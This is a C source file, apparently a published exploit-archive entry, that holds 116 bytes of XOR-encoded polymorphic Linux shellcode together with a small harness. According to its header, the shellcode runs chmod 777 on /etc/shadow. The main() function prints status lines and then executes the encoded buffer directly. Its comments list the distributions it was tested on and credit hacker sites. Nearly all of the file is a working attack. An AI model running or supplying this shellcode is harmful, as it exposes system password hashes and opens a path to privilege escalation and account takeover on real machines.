/*
 * sys_execve("/bin/chmod", { "/bin/chmod", "777" }, "/etc/shadow") 116 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char encoded_shadow[] = "\xeb\x0d\x5e\x31\xc9\xb1\x60\x80\x36\x72"
			"\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
			"\x43\xb2\xf1\x9e\x73\xfa\x76\x56\x1a\x13"
			"\x16\x1d\x05\x1a\x11\x5d\x01\x1a\x14\x1a"
			"\x17\x06\xf1\x9e\x73\xb4\x76\x56\x5d\xfb"
			"\x94\xf1\x9e\x73\xfa\x76\x56\x14\x1a\x45"
			"\x45\xf1\x9e\x73\xb4\x76\x56\x45\xf1\x9e"
			"\x73\xfa\x76\x56\x1a\x1a\x1f\x1d\x16\x1a"
			"\x1b\x1c\x5d\x11\x14\x1a\x5d\x10\x22\x24"
			"\xf1\x9c\x76\x24\xf1\x9c\x79\x24\xc2\x79"
			"\xfb\x81\xfb\x93\xfb\x90\x43\xa0\xbf\xf2"
			"\x43\xa9\xc2\x73\xbf\xf2";

int main(void) {
  int shadow_len = strlen(encoded_shadow);
  printf("[+] Using key engine mutation : 0x72\n");
  printf("[+] Length of this shellcode is : %d bytes\n", shadow_len);
  printf("[+] After executing this code, make sure check permission of the \"/etc/shadow\" file\n");
  (*(void(*)())encoded_shadow)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */